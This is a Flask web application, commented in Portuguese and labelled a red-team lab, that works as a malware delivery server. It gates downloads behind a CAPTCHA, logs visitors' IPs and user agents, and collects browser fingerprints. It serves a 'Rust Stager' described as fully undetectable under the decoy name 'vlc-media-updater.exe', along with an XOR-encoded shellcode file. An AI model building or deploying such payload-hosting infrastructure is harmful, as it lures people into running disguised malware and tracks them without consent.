import os
import uuid
import random
import time
import hmac
import io
from datetime import datetime, timedelta
from flask import Flask, render_template, request, session, send_file, abort, redirect, url_for, jsonify
from PIL import Image, ImageDraw, ImageFont, ImageFilter
from werkzeug.utils import secure_filename
from functools import wraps

app = Flask(__name__, template_folder="templates", static_folder="static")
app.secret_key = os.urandom(32)
app.permanent_session_lifetime = timedelta(minutes=30)

BASE_DIR = os.path.dirname(os.path.abspath(__file__))

# Cria pastas necessárias
for pasta in ["downloads", "static/payloads", "logs", "static/fonts"]:
    os.makedirs(os.path.join(BASE_DIR, pasta), exist_ok=True)

# Dicionário de payloads (fácil de expandir)
PAYLOADS = {
    "vlc": {
        "file": "vlc-media-updater.exe",      # Nome real do arquivo salvo
        "desc": "Rust Stager (FUD)"
    }
}

# Controle de IPs que já passaram no CAPTCHA (válido por 30 min)
ip_validado = {}


def log_access(mensagem: str):
    """Registra todos os acessos no arquivo de log"""
    ip = request.remote_addr or "unknown"
    ua = request.headers.get("User-Agent", "unknown")
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    caminho_log = os.path.join(BASE_DIR, "logs/access.log")
    with open(caminho_log, "a", encoding="utf-8") as f:
        f.write(f"[{timestamp}] {ip} | {ua} | {mensagem}\n")


# ============================================================
# ===================== CAPTCHA MELHORADO ====================
# ============================================================

def gerar_captcha(dificuldade: str = "medio"):
    """
    Gera um CAPTCHA mais forte e legível.
    Dificuldades: 'facil', 'medio', 'dificil'
    """
    largura, altura = 460, 170
    img = Image.new("RGB", (largura, altura), "#0d1117")
    draw = ImageDraw.Draw(img)

    # === 1. Ruído de fundo (pontos) ===
    for _ in range(1100):
        x = random.randint(0, largura - 1)
        y = random.randint(0, altura - 1)
        cor = (random.randint(25, 70),) * 3
        draw.point((x, y), fill=cor)

    # === 2. Grid de fundo ===
    for x in range(0, largura, 28):
        draw.line([(x, 0), (x, altura)], fill="#23272f", width=1)
    for y in range(0, altura, 28):
        draw.line([(0, y), (largura, y)], fill="#23272f", width=1)

    # === 3. Texto do CAPTCHA ===
    chars = "ABCDEFGHJKLMNPQRSTUVWXYZ23456789"
    if dificuldade == "dificil":
        chars += "abcdefghjkmnpqrstuvwxyz"

    tamanho = 6 if dificuldade != "facil" else 5
    codigo = ''.join(random.choices(chars, k=tamanho))

    # Posição inicial do texto
    x_pos = 35
    for letra in codigo:
        try:
            tamanho_fonte = random.randint(52, 68)
            font = ImageFont.truetype(
                os.path.join(BASE_DIR, "static/fonts/arialbd.ttf"), tamanho_fonte
            )
        except:
            font = ImageFont.load_default()

        # Cor aleatória (tons claros)
        cor = (
            random.randint(140, 255),
            random.randint(140, 255),
            random.randint(200, 255)
        )

        # Rotação aleatória
        angulo = random.randint(-28, 28)

        # Cria imagem temporária da letra
        temp = Image.new("RGBA", (90, 110), (0, 0, 0, 0))
        d = ImageDraw.Draw(temp)
        d.text((15, 12), letra, font=font, fill=cor)

        # Rotaciona a letra
        rotacionada = temp.rotate(angulo, expand=True, resample=Image.BICUBIC)

        # Cola no imagem principal com pequena variação de posição
        pos_y = random.randint(32, 55)
        img.paste(rotacionada, (x_pos + random.randint(-8, 8), pos_y), rotacionada)
        x_pos += random.randint(52, 68)

    # === 4. Linhas de interferência ===
    for _ in range(7):
        x1, y1 = random.randint(10, 120), random.randint(10, 160)
        x2, y2 = random.randint(320, 450), random.randint(10, 160)
        cor_linha = (random.randint(70, 160), random.randint(90, 200), 255)
        draw.line([(x1, y1), (x2, y2)], fill=cor_linha, width=2)

    # === 5. Filtro final ===
    img = img.filter(ImageFilter.SMOOTH_MORE)

    # === 6. Salva e armazena na sessão ===
    nome_arquivo = f"captcha_{uuid.uuid4().hex[:10]}.png"
    caminho = os.path.join(BASE_DIR, "downloads", nome_arquivo)
    img.save(caminho, "PNG")

    # Armazena na sessão com tempo de expiração
    session["captcha_codigo"] = codigo
    session["captcha_arquivo"] = nome_arquivo
    session["captcha_criado_em"] = time.time()

    return codigo, nome_arquivo


def validar_captcha(entrada_usuario: str) -> bool:
    """Valida o CAPTCHA com expiração de 5 minutos"""
    if "captcha_codigo" not in session or "captcha_criado_em" not in session:
        return False

    # Expiração de 5 minutos
    if time.time() - session["captcha_criado_em"] > 300:
        return False

    codigo_correto = session.get("captcha_codigo", "")
    return hmac.compare_digest(entrada_usuario.upper().strip(), codigo_correto)


def require_captcha(f):
    """Decorator que exige CAPTCHA validado"""
    @wraps(f)
    def wrapper(*args, **kwargs):
        ip = request.remote_addr
        if ip not in ip_validado or time.time() > ip_validado[ip]:
            log_access("BLOQUEADO - CAPTCHA NÃO VALIDADO")
            return redirect(url_for("index"))
        return f(*args, **kwargs)
    return wrapper


# ============================================================
# ======================== ROTAS ============================
# ============================================================

@app.route("/", methods=["GET", "POST"])
def index():
    """Página principal com CAPTCHA"""
    ip = request.remote_addr
    log_access("ACESSOU PÁGINA PRINCIPAL")

    if request.method == "POST":
        entrada = request.form.get("captcha_input", "")
        if validar_captcha(entrada):
            # CAPTCHA correto → libera por 30 minutos
            ip_validado[ip] = time.time() + 1800
            log_access("CAPTCHA RESOLVIDO COM SUCESSO")

            # Limpa arquivos antigos de captcha
            try:
                arquivo_antigo = session.get("captcha_arquivo")
                if arquivo_antigo:
                    os.remove(os.path.join(BASE_DIR, "downloads", arquivo_antigo))
            except:
                pass

            return render_template("success.html")
        else:
            log_access("CAPTCHA INCORRETO")

    # Gera novo CAPTCHA
    _, nome_imagem = gerar_captcha(dificuldade="medio")
    return render_template("index.html", captcha_image=nome_imagem)


@app.route("/c/<nome>")
def serve_captcha(nome):
    """Serve a imagem do CAPTCHA"""
    caminho = os.path.join(BASE_DIR, "downloads", secure_filename(nome))
    if os.path.exists(caminho):
        return send_file(caminho, mimetype="image/png")
    abort(404)


@app.route("/get_rusta")
@require_captcha
def get_rusta():
    """Entrega o Rust Stager"""
    caminho = os.path.join(BASE_DIR, "static/payloads", "vlc-media-updater.exe")
    if not os.path.exists(caminho):
        abort(404)
    log_access("RUST STAGER BAIXADO")
    ip_validado.pop(request.remote_addr, None)
    return send_file(caminho, as_attachment=True, download_name="vlc-media-updater.exe")


@app.route("/get_sc")
@require_captcha
def get_sc():
    """Entrega o shellcode XORado"""
    caminho = os.path.join(BASE_DIR, "static/payloads", "sc.bin")
    if not os.path.exists(caminho):
        abort(404)
    log_access("SHELLCODE BAIXADO")
    ip_validado.pop(request.remote_addr, None)
    return send_file(caminho, mimetype="application/octet-stream")

@app.route("/fingerprint", methods=["POST"])
def receber_fingerprint():
    """Recebe e registra o fingerprint do navegador"""
    try:
        dados = request.get_json()
        ip = request.remote_addr
        ua = request.headers.get("User-Agent", "unknown")

        log_access(f"FINGERPRINT RECEBIDO | IP: {ip}")

        # Salva em arquivo separado para análise posterior
        caminho_fp = os.path.join(BASE_DIR, "logs/fingerprints.log")
        with open(caminho_fp, "a", encoding="utf-8") as f:
            f.write(f"\n{'='*70}\n")
            f.write(f"Data: {datetime.now()}\n")
            f.write(f"IP: {ip}\n")
            f.write(f"User-Agent: {ua}\n")
            f.write(f"Dados: {dados}\n")

        return jsonify({"status": "ok"})
    except Exception as e:
        return jsonify({"status": "error"}), 400
    




if __name__ == "__main__":
    print("=" * 70)
    print("🔥 LAB RED TEAM 2026 - RUST STAGER + CAPTCHA MELHORADO")
    print("http://127.0.0.1:5000")
    print("=" * 70)
    app.run(host="0.0.0.0", port=5000, threaded=True, debug=False)